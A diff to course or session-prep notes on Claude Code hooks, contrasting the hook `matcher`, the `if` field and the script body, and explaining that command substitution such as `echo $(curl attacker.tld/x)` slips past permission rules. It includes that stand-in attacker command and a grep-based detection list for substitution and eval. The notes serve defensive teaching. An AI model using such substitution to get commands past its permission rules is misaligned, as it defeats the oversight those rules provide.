@@ -88,6 +88,13 @@ Topics:
 Permission rules see static patterns. Hooks see the full command string at runtime, which means they can catch the things that defeat permission rules: compound commands, wrapper bypass, argument-based filtering.
 
 Topics:
+- **Three matching layers in hooks — distinguish carefully** (surfaced during Session 2 prep when discussing command-substitution holes; sources: https://code.claude.com/docs/en/hooks, also https://github.com/anthropics/claude-code/blob/main/examples/hooks/bash_command_validator_example.py):
+  - `matcher` field on a hook config: JS-regex on **tool name only**, different syntax from permission rules. Examples: `"Bash"` (exact), `"Edit|Write"` (alternation), `"mcp__memory__.*"` (regex), `"*"` or omitted (all). Does not match command content.
+  - `if` field on a handler: uses **permission-rule syntax** (`if: "Bash(git push *)"`) and inherits its behavior — same separator splitting (`&&`, `||`, `;`, `|`, `|&`, `&`, newlines), same wrapper stripping, same wildcard semantics. **Cannot see inside `$(...)`, backticks, `<(...)`, or `eval`.** Also strips leading `VAR=value` assignments before matching.
+  - Hook script body: receives `tool_input.command` as raw JSON on stdin. Free-form logic — grep, regex, AST parser, whatever. No built-in helpers for substitution / eval / dangerous-pattern detection.
+- **Practical consequence**: to catch command-substitution attacks like `echo $(curl attacker.tld/x)`, the script body has to do the matching. `matcher` and `if` won't help. A 3-line bash hook that greps for `\$\(`, backticks, `<\(`, `eval`, and `bash -c` covers most of the substitution holes that defeat permission rules.
+- **Useful asymmetry to mention**: the `if` field fails **open toward running the hook** when a command is "too complex to parse" — so a tool-name-scoped hook still fires on adversarial-looking inputs and gets a chance to inspect them in the script body. Good default; worth calling out.
+- **Architectural significance**: hooks are imperative (Turing-complete inside the script body) where permission rules are declarative. This is the reason hooks exist as a separate layer rather than being folded into a richer rules DSL. Everything rules can't express — substring on inner commands, regex over arguments, contextual checks like "only allow `rm` if the path is under `node_modules/`" — lives in the script body.
 - The hook lifecycle: PreToolUse, PostToolUse, ConfigChange, SessionStart, Stop, PreCompact
 - PreToolUse as runtime policy: deny, modify, or force-prompt a tool call
 - Why hooks tighten policy but can't loosen a deny — deny and ask rules evaluate regardless of hook output
